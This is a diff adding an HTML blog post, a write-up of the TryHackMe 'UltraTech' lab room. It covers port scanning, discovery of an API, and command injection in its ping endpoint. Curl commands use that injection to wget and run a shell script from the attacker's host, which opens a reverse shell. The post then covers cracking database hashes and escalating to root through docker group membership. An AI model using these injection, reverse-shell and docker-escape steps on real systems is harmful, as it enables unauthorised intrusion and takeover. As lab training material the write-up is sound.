@@ -1,0 +1,195 @@
+I"�$<h2 id="description">Description:</h2>
+
+<p>The Following Post is writeup of UltraTech room of tryhackme <a href="https://tryhackme.com/room/ultratech1">https://tryhackme.com/room/ultratech1</a></p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Machine</th>
+      <th style="text-align: left">Details</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">OS</td>
+      <td style="text-align: left">Linux</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Rating</td>
+      <td style="text-align: left">Medium</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Creator</td>
+      <td style="text-align: left">lp1</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="summary">Summary:</h2>
+
+<p>The room have only 4 ports open 21,22,8081,31331 we can see webpage in 31331 and login api in 8081.
+  Webpage have few hidden pages and a code api.js we can get reverse shell using ping command which js executes.
+  After shell we got the open database and after cracking hashes we will get user.
+  The user have docker permissions so GTFObins and root.</p>
+
+<h2 id="walkthrough">Walkthrough:</h2>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>As usual
+Lets start with nmap scan</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td> --><td class="rouge-code"><pre><span class="go">┌─[silver@parrot]─[~/Desktop/tryhackme/ultratech]
+</span><span class="gp">└──╼ $</span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.70.180
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-14 03:48 EDT
+Nmap scan report for 10.10.70.180
+Host is up (0.37s latency).
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+</span><span class="gp">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
+<span class="go">| ssh-hostkey:
+|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
+|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
+|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
+8081/tcp open  http    Node.js Express framework
+|_http-cors: HEAD GET POST PUT DELETE PATCH
+</span><span class="gp">|_http-title: Site doesn't have a title (text/html;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8<span class="o">)</span><span class="nb">.</span>
+<span class="gp">Service Info: OSs: Unix, Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>I missed something it looks like so went back to enum with masscan</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td> --><td class="rouge-code"><pre><span class="gp">└──╼ $</span><span class="nb">sudo </span>masscan <span class="nt">-i</span> tun0 <span class="nt">-p</span> 0-65535 10.10.107.93
+<span class="go">
+Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-08-20 06:24:53 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65536 ports/host]
+Discovered open port 31331/tcp on 10.10.107.93                                 
+Discovered open port 8081/tcp on 10.10.107.93                                  
+Discovered open port 21/tcp on 10.10.107.93                                    
+Discovered open port 22/tcp on 10.10.107.93
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="webpage">Webpage</h4>
+
+<p>Ah gotcha port 31331 have web page.<br />
+<img src="/assets/img/ultratech/webpage.png" alt="Webpage" /><br />
+Let’s enum a bit</p>
+
+<p>Got robots.txt</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre><span class="na">Allow</span><span class="pi">:</span> <span class="err">*</span>
+<span class="na">User-Agent</span><span class="pi">:</span> <span class="err">*</span>
+<span class="na">Sitemap</span><span class="pi">:</span> <span class="s">/utech_sitemap.txt</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Sitemap.txt</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre><span class="s">/</span>
+<span class="s">/index.html</span>
+<span class="s">/what.html</span>
+<span class="s">/partners.html</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We can see login portal in partners.html on trying auth it redirect  us to 8081 page with /auth.
+let’s check how this api is handled.</p>
+
+<p><img src="/assets/img/ultratech/js.png" alt="JS" /></p>
+
+<p>we can see api.js let’s check.</p>
+
+<p><img src="/assets/img/ultratech/apijs.png" alt="api.js" /></p>
+
+<h3 id="exploitation">Exploitation:</h3>
+
+<p>Now we know the js first check by pinging the host.
+This is potential command injection we just have to replace the ping with a command.</p>
+
+<p><img src="/assets/img/ultratech/pingwhoami.png" alt="whoami" /></p>
+
+<p>Ah we can see it got executed.</p>
+
+<p>let’s get a reverse shell using</p>
+
+<p>made a file and wget it to the machine and execute it</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre><span class="go">curl http://10.10.190.208:8081/ping?ip=`wget ip/cmd.sh`  
+curl http://10.10.190.208:8081/ping?ip=`bash%20./cmd.sh`
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td> --><td class="rouge-code"><pre><span class="gp">└──╼ $</span>pwncat <span class="nt">--listen</span> <span class="nt">--port</span> 4444
+<span class="go">bound to 0.0.0.0:4444 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[11:00:54] received connection from 10.10.190.208:58502                                                                 connect.py:149
+[11:00:57] new host w/ hash f3ffe57d520772919cc2b2bb75c3c44c                                                             victim.py:328
+[11:01:14] pwncat running in /bin/sh                                                                                     victim.py:362
+initializing: complete ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0%
+[11:01:21] pwncat is ready 🐈                                                                                            victim.py:758
+
+
+</span><span class="gp">\[\033[01;</span>31m<span class="se">\]</span><span class="o">(</span>remote<span class="o">)</span><span class="se">\[\0</span>33[00m<span class="se">\]</span> <span class="se">\[\0</span>33[01<span class="p">;</span>33m<span class="se">\]\u</span>@<span class="se">\h\[\0</span>33[00m<span class="se">\]</span>:<span class="se">\[\0</span>33[01<span class="p">;</span>36m<span class="se">\]\w\[\0</span>33[00m<span class="se">\]</span><span class="err">$</span>
+<span class="go">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Alright got shell as www user and we can see the db file.
+<img src="/assets/img/ultratech/techdb.png" alt="DB" /></p>
+
+<p>Got the hashes, move to cracking.
+<img src="/assets/img/ultratech/hashcracked.png" alt="Cracking" /></p>
+
+<p>Yessss got r00t user let’s see what we can do with it.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre><span class="gp">r00t@ultratech-prod:/tmp$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
+
+so we can see docker privesc time
+
+</span><span class="gp">r00t@ultratech-prod:/tmp$</span><span class="w"> </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span class="nt">-it</span> bash <span class="nb">chroot</span> /mnt sh      
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>rooted Ultratech :)</p>
+:ET
